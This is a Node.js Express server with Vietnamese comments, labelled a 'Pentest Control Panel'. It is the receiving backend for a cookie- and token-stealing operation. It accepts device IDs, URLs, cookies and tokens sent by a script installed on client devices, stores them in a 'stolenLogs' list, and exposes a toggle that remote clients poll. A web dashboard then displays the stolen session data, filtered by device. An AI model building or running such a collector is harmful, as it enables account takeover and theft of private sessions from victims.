const express = require('express');
const app = express();
const PORT = process.env.PORT || 3000;

app.use(express.json());

let stolenLogs = [];
let globalCollectionEnabled = false; // Mặc định tắt

// 1. API chuyển đổi trạng thái (Nhận yêu cầu từ nút bấm trực quan trên web)
app.get('/toggle', (req, res) => {
    globalCollectionEnabled = !globalCollectionEnabled;
    // Nếu gọi từ web, tự động chuyển hướng (redirect) về lại trang chủ để cập nhật giao diện nút bấm
    res.redirect('/');
});

// 2. API cho client kiểm tra trạng thái
app.get('/status', (req, res) => {
    res.json({ collect: globalCollectionEnabled });
});

// 3. API nhận dữ liệu từ Client (Chỉ nhận khi server bật)
app.post('/', (req, res) => {
    if (!globalCollectionEnabled) {
        return res.status(403).json({ status: "skipped" });
    }

    const { deviceId, url, cookie, token } = req.body;
    
    stolenLogs.push({
        time: new Date().toLocaleString(),
        deviceId: deviceId || 'Thiết bị không rõ',
        url: url || 'Không rõ URL',
        cookie: cookie || null,
        token: token || null
    });

    if (stolenLogs.length > 200) {
        stolenLogs.shift();
    }

    res.status(200).json({ status: "success" });
});

// 4. Giao diện trang chủ có Nút Bật/Tắt Trực Quan và Lọc Thiết Bị
app.get('/', (req, res) => {
    const selectedDevice = req.query.device || 'all';
    let logRows = '';
    
    let filteredLogs = stolenLogs;
    if (selectedDevice !== 'all') {
        filteredLogs = stolenLogs.filter(log => log.deviceId === selectedDevice);
    }

    const uniqueDevices = [...new Set(stolenLogs.map(log => log.deviceId))];
    let deviceOptions = `<option value="all">Tất cả thiết bị</option>`;
    uniqueDevices.forEach(dev => {
        deviceOptions += `<option value="${dev}" ${selectedDevice === dev ? 'selected' : ''}>${dev}</option>`;
    });

    if (filteredLogs.length === 0) {
        logRows = `<tr><td colspan="5" style="text-align:center; padding: 20px; color: #888;">Chưa có dữ liệu cho thiết bị này...</td></tr>`;
    } else {
        filteredLogs.slice().reverse().forEach((log) => {
            logRows += `
                <tr style="border-bottom: 1px solid #ddd;">
                    <td style="padding: 12px; color: #666; font-size: 14px;">${log.time}</td>
                    <td style="padding: 12px; font-weight: bold; color: #28a745;">${log.deviceId}</td>
                    <td style="padding: 12px; color: #007bff; word-break: break-all;">${log.url}</td>
                    <td style="padding: 12px; background: #fdf5e6;"><pre style="margin:0; white-space: pre-wrap; word-break: break-all;">${log.cookie || '<span style="color:red">Không có</span>'}</pre></td>
                    <td style="padding: 12px; background: #eef9ff;"><pre style="margin:0; white-space: pre-wrap; word-break: break-all;">${log.token || '<span style="color:red">Không có</span>'}</pre></td>
                </tr>
            `;
        });
    }

    // Thiết kế giao diện nút bấm trực quan (UI Toggle Button)
    const btnStyle = globalCollectionEnabled 
        ? "background-color: #28a745; color: white;" 
        : "background-color: #dc3545; color: white;";
    const btnText = globalCollectionEnabled 
        ? "🟢 ĐANG BẬT (Click để Tắt)" 
        : "🔴 ĐANG TẮT (Click để Bật)";

    res.send(`
    <!DOCTYPE html>
    <html lang="vi">
    <head>
        <meta charset="UTF-8">
        <title>Pentest Control Panel - Dashboard</title>
    </head>
    <body style="font-family: system-ui, sans-serif; margin: 30px; background-color: #f8f9fa;">
        <h2 style="color: #333; border-bottom: 2px solid #333; padding-bottom: 10px;">🛡️ Bảng Điều Khiển Pentest Logs</h2>
        
        <!-- Khu vực điều khiển trực quan -->
        <div style="display: flex; align-items: center; justify-content: space-between; background: white; padding: 20px; border-radius: 8px; box-shadow: 0 2px 5px rgba(0,0,0,0.05); margin-bottom: 20px;">
            <div>
                <h3 style="margin: 0 0 5px 0; color: #333;">Trạng thái hệ thống thu thập</h3>
                <p style="margin: 0; color: #666; font-size: 14px;">Khi bật, các thiết bị có cài script sẽ tự động gửi log về đây.</p>
            </div>
            <div>
                <a href="/toggle" style="text-decoration: none; padding: 12px 24px; font-size: 16px; font-weight: bold; border-radius: 6px; ${btnStyle} display: inline-block; box-shadow: 0 2px 4px rgba(0,0,0,0.1);">
                    ${btnText}
                </a>
            </div>
        </div>

        <!-- Thanh lọc thiết bị -->
        <div style="margin-bottom: 20px; background: white; padding: 15px 20px; border-radius: 8px; box-shadow: 0 2px 5px rgba(0,0,0,0.05);">
            <label style="font-weight: bold; margin-right: 10px;">Lọc theo thiết bị:</label>
            <select onchange="location.href='/?device=' + this.value" style="padding: 8px; border-radius: 5px; border: 1px solid #ccc; width: 250px;">
                ${deviceOptions}
            </select>
        </div>

        <!-- Bảng hiển thị log -->
        <table style="width: 100%; border-collapse: collapse; background: white; box-shadow: 0 2px 5px rgba(0,0,0,0.05); border-radius: 8px; overflow: hidden;">
            <thead>
                <tr style="background-color: #343a40; color: white; text-align: left;">
                    <th style="padding: 12px; width: 15%;">Thời gian</th>
                    <th style="padding: 12px; width: 15%;">Tên thiết bị</th>
                    <th style="padding: 12px; width: 20%;">Ứng dụng / URL</th>
                    <th style="padding: 12px; width: 25%;">Cookie</th>
                    <th style="padding: 12px; width: 25%;">Token</th>
                </tr>
            </thead>
            <tbody>
                ${logRows}
            </tbody>
        </table>
    </body>
    </html>
    `);
});

app.listen(PORT, () => {
    console.log(`🚀 Server hoạt động tại cổng ${PORT}`);
});
